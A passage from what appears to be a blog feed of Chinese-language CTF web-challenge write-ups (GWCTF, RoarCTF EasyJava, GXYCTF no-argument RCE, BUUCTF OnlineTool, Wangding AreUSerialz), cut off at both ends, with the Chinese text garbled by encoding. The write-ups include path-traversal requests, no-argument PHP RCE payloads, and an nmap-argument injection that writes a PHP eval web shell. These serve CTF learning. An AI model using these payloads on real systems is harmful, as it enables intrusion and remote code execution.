punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd</code></pre><p><img src="/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/image-20210620145954227.png" alt="image-20210620145954227"></p><p>flagåº”è¯¥åœ¨æ ¹ç›®å½•ä¸‹</p><pre><code>target=db_sql.php%253f/../../../../../../../../flag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF:2019-EasyJava</title>
      <link href="2021/06/20/roarctf-2019-easyjava/"/>
      <url>2021/06/20/roarctf-2019-easyjava/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB-INF-web-xmlæ³„éœ²"><a href="#WEB-INF-web-xmlæ³„éœ²" class="headerlink" title="WEB-INF/web.xmlæ³„éœ²"></a>WEB-INF/web.xmlæ³„éœ²</h3><ul><li>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:</li><li>/WEB-INF/web.xmlï¼šWeb-javaåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</li><li>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéžservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</li><li>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</li><li>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æž„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</li><li>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</li><li>æ¼æ´žæ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼ŒæŽ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åŽç›´æŽ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </li></ul><p>postè®¿é—®ä¸‹WEB-INF/web.xmlè¿™ä¸ªæ–‡ä»¶</p><p><img src="/2021/06/20/roarctf-2019-easyjava/image-20210620111455057.png" alt="image-20210620111455057"></p><pre><code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p><img src="/2021/06/20/roarctf-2019-easyjava/image-20210620111745251.png" alt="image-20210620111745251"></p><p>ä¸‹è½½çš„æ–‡ä»¶è¿›è¡Œbase64è§£ç </p><p><img src="/2021/06/20/roarctf-2019-easyjava/image-20210620111813590.png" alt="image-20210620111813590"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF:2019-ç¦æ­¢å¥—å¨ƒ</title>
      <link href="2021/06/19/gxyctf-2019-jin-zhi-tao-wa/"/>
      <url>2021/06/19/gxyctf-2019-jin-zhi-tao-wa/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-localeconv-å‡½æ•°"><a href="#PHP-localeconv-å‡½æ•°" class="headerlink" title="PHP localeconv() å‡½æ•°"></a>PHP localeconv() å‡½æ•°</h2><h2 id="å®šä¹‰å’Œç”¨æ³•"><a href="#å®šä¹‰å’Œç”¨æ³•" class="headerlink" title="å®šä¹‰å’Œç”¨æ³•"></a>å®šä¹‰å’Œç”¨æ³•</h2><p>localeconv() å‡½æ•°è¿”å›žä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p><p>localeconv() å‡½æ•°ä¼šè¿”å›žä»¥ä¸‹æ•°ç»„å…ƒç´ ï¼š</p><ul><li><p>[decimal_point] - å°æ•°ç‚¹å­—ç¬¦</p></li><li><p>[thousands_sep] - åƒä½åˆ†éš”ç¬¦</p></li><li><p>[int_curr_symbol] - è´§å¸ç¬¦å· ï¼ˆä¾‹å¦‚ï¼šUSDï¼‰</p></li><li><p>[currency_symbol] - è´§å¸ç¬¦å· ï¼ˆä¾‹å¦‚ï¼š$ï¼‰</p></li><li><p>[mon_decimal_point] - è´§å¸å°æ•°ç‚¹å­—ç¬¦</p></li><li><p>[mon_thousands_sep] - è´§å¸åƒä½åˆ†éš”ç¬¦</p></li><li><p>[positive_sign] - æ­£å€¼å­—ç¬¦</p></li><li><p>[negative_sign] - è´Ÿå€¼å­—ç¬¦</p></li><li><p>[int_frac_digits] - å›½é™…é€šç”¨å°æ•°ä½</p></li><li><p>[frac_digits] - æœ¬åœ°é€šç”¨å°æ•°ä½</p></li><li><p>[p_cs_precedes] - å¦‚æžœè´§å¸ç¬¦å·åœ¨ä¸€ä¸ªæ­£æ•°å€¼ä¹‹å‰æ˜¾ç¤ºï¼Œåˆ™ä¸º Trueï¼ˆ1ï¼‰ï¼Œå¦‚æžœåœ¨æ­£æ•°å€¼ä¹‹åŽæ˜¾ç¤ºï¼Œåˆ™ä¸º Falseï¼ˆ0ï¼‰</p></li><li><p>[p_sep_by_space] - å¦‚æžœåœ¨è´§å¸ç¬¦å·å’Œæ­£æ•°å€¼ä¹‹é—´åŒ…å«ç©ºæ ¼ï¼Œåˆ™ä¸º Trueï¼ˆ1ï¼‰ï¼Œå¦åˆ™ä¸º Falseï¼ˆ0ï¼‰</p></li><li><p>[n_cs_precedes] - å¦‚æžœè´§å¸ç¬¦å·åœ¨ä¸€ä¸ªè´Ÿæ•°å€¼ä¹‹å‰æ˜¾ç¤ºï¼Œåˆ™ä¸º Trueï¼ˆ1ï¼‰ï¼Œå¦‚æžœåœ¨è´Ÿæ•°å€¼ä¹‹åŽæ˜¾ç¤ºï¼Œåˆ™ä¸º Falseï¼ˆ0ï¼‰</p></li><li><p>[n_sep_by_space] - å¦‚æžœåœ¨è´§å¸ç¬¦å·å’Œè´Ÿæ•°å€¼ä¹‹é—´åŒ…å«ç©ºæ ¼ï¼Œåˆ™ä¸º Trueï¼ˆ1ï¼‰ï¼Œå¦åˆ™ä¸º Falseï¼ˆ0ï¼‰</p></li><li><p>[p_sign_posn] - æ ¼å¼åŒ–é€‰é¡¹ï¼š</p></li><li><ul><li>0 - æŠŠæ•°é‡å’Œè´§å¸ç¬¦å·å†™åœ¨åœ†æ‹¬å·å†…</li><li>1 - åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š + å·</li><li>2 - åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹åŽåŠ ä¸Š + å·</li><li>3 - ç›´æŽ¥åœ¨è´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š + å·</li><li>4 - ç›´æŽ¥åœ¨è´§å¸ç¬¦å·ä¹‹åŽåŠ ä¸Š + å·</li></ul></li><li><p>[n_sign_posn] - æ ¼å¼åŒ–é€‰é¡¹ï¼š</p></li><li><ul><li>0 - æŠŠæ•°é‡å’Œè´§å¸ç¬¦å·å†™åœ¨åœ†æ‹¬å·å†…</li><li>1 - åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š - å·</li><li>2 - åœ¨æ•°é‡å’Œè´§å¸ç¬¦å·ä¹‹åŽåŠ ä¸Š - å·</li><li>3 - ç›´æŽ¥åœ¨è´§å¸ç¬¦å·ä¹‹å‰åŠ ä¸Š - å·</li><li>4 - ç›´æŽ¥åœ¨è´§å¸ç¬¦å·ä¹‹åŽåŠ ä¸Š - å·</li></ul></li><li><p>[grouping] - æ˜¾ç¤ºæ•°å­—ç»„åˆå½¢å¼çš„æ•°ç»„ï¼ˆä¾‹å¦‚ï¼š3 æŒ‡ç¤º 1 000 000ï¼‰</p></li><li><p>[mon_grouping] - æ˜¾ç¤ºè´§å¸æ•°å­—ç»„åˆå½¢å¼çš„æ•°ç»„ï¼ˆä¾‹å¦‚ï¼š2 æŒ‡ç¤º 1 00 00 00ï¼‰</p></li></ul><h2 id="GXYCTF-2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF-2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="GXYCTF:2019-ç¦æ­¢å¥—å¨ƒ"></a>GXYCTF:2019-ç¦æ­¢å¥—å¨ƒ</h2><pre class=" language-php+HTML"><code class="language-php+HTML"><?phpinclude "flag.php";echo "flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>";if(isset($_GET['exp'])){    //è¿‡æ»¤PHPä¼ªåè®®    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {        //è¿‡æ»¤å‚æ•°        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {           //è¿‡æ»¤å­—æ®µ            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {                // echo $_GET['exp'];                @eval($_GET['exp']);            }            else{                die("è¿˜å·®ä¸€ç‚¹å“¦ï¼");            }        }        else{            die("å†å¥½å¥½æƒ³æƒ³ï¼");        }    }    else{        die("è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼");    }}// highlight_file(__FILE__);?></code></pre><p>æ­£åˆ™è¿‡æ»¤æŽ‰äº†ä»¥ä¸Šè¿™äº›æœ‰çš„æ²¡çš„ï¼Œå½¢æˆäº†æ— å‚æ•°RCE</p><pre><code>?exp=print_r(scandir(pos(localeconv())));</code></pre><pre><code>?exp=print_r(scandir(current(localeconv())));</code></pre><p><img src="/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/image-20210619205826301.png" alt="image-20210619205826301"></p><pre class=" language-python"><code class="language-python">?exp<span class="token operator">=</span>show_source<span class="token punctuation">(</span>next<span class="token punctuation">(</span>array_reverse<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span>pos<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre><code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></pre><p><img src="/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/image-20210619213824598.png" alt="image-20210619213824598"></p><pre><code>?exp=var_dump(file(next(array_reverse(scandir(current(localeconv()))))));</code></pre><p><img src="/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/image-20210619214613711.png" alt="image-20210619214613711"></p><p>è¿™ä¸ªæˆ‘æ²¡æœ‰å®žçŽ°ï¼š</p><pre><code>?exp=show_source(session_id(session_start()));</code></pre><p><img src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200204202513684-10866717.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF:2018-OnlineTool</title>
      <link href="2021/06/19/buuctf-2018-onlinetool/"/>
      <url>2021/06/19/buuctf-2018-onlinetool/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//æœåŠ¡å™¨èŽ·å–ip</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li><p>namp -PS 127.0.0.1</p></li><li><p>namp -PS â€˜â€™ 127.0.0.1</p></li><li><p>nmap -PS â€™ â€œ â€œ â€™ 127.0.0.1 â€œ â€œ<br> å¼•å·é—­åˆåŽï¼ŒåŠ ä¸Šè¿™äº›ï¼Œæ— å½±å“</p></li><li><pre><code>namp &lt;?php phpinfo(); ?&gt; -oG 1.php</code></pre><p> å¯ä»¥å†™å…¥ä¸€ä¸ªæ–‡ä»¶</p></li><li><pre><code>namp nmap &lt;?php phpinfo();&gt; -oG 1.php\â€™</code></pre><p> ä¼šå†™æˆ1.phpâ€˜ è€Œä¸æ˜¯ 1.php</p></li></ul><h3 id="escapeshellarg-escapeshellcmd"><a href="#escapeshellarg-escapeshellcmd" class="headerlink" title="escapeshellarg(),escapeshellcmd()"></a>escapeshellarg(),escapeshellcmd()</h3><ol><li>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<code>172.17.0.2' -v -d a=1</code></li><li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†åŽå˜æˆäº†<code>'172.17.0.2'\'' -v -d a=1'</code>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»Žè€Œèµ·åˆ°è¿žæŽ¥çš„ä½œç”¨ã€‚</li><li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†åŽå˜æˆ<code>'172.17.0.2'\\'' -v -d a=1\'</code>ï¼Œè¿™æ˜¯å› ä¸º<code>escapeshellcmd</code>å¯¹\ä»¥åŠæœ€åŽé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>æœ€åŽæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl â€˜172.17.0.2â€™\â€˜â€™ -v -d a=1'ï¼Œç”±äºŽä¸­é—´çš„\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åŽé¢çš„â€™æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸Žå†åŽé¢çš„â€™é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿žæŽ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1â€™ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚</li></ol><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string">'&lt;?php @eval($_POST[1]);?> -oG 1.php '</span></code></pre><p><img src="/2021/06/19/buuctf-2018-onlinetool/1.png" alt="1"></p><pre class=" language-php"><code class="language-php"><span class="token string">' &lt;?php eval($_POST[1]);?> -oG 1.php '</span></code></pre><p>é‡‡ç”¨è¿™ä¸ªæµ‹è¯•ä¸€ä¸‹ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string">' &lt;?php @eval($_POST[1]);?> -oG 1.php '</span><span class="token punctuation">;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$host</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>è¾“å‡º</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token string">"/&lt;/?php @eval/(/$_POST/[1/]/);/?/> -oG 1.php/"</span></code></pre><pre class=" language-php"><code class="language-php">nmap <span class="token operator">-</span><span class="token constant">T5</span> <span class="token operator">-</span>sT <span class="token operator">-</span>Pn <span class="token operator">--</span>host<span class="token operator">-</span>timeout <span class="token number">2</span> <span class="token operator">-</span>F <span class="token string">' &lt;?php @eval($_POST[1]);?> -oG 1.php '</span></code></pre><p>èšå‰‘è¿žæŽ¥ï¼š</p><pre class=" language-php"><code class="language-php">url<span class="token operator">/</span>3e12369d084243c43ba31e472a06c3f7<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>php</code></pre><p><img src="/2021/06/19/buuctf-2018-onlinetool/2.png" alt="2"></p><p>æˆ–è€…ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string">' &lt;?php echo `cat /flag`;?> -oG test.php '</span></code></pre><p>ç›´æŽ¥è®¿é—®test.php</p><p><img src="/2021/06/19/buuctf-2018-onlinetool/3.png" alt="3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯:2020-AreUSerialz</title>
      <link href="2021/06/18/wang-ding-bei-2020-areuserialz/"/>
      <url>2021/06/18/wang-ding-bei-2020-areuserialz/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token 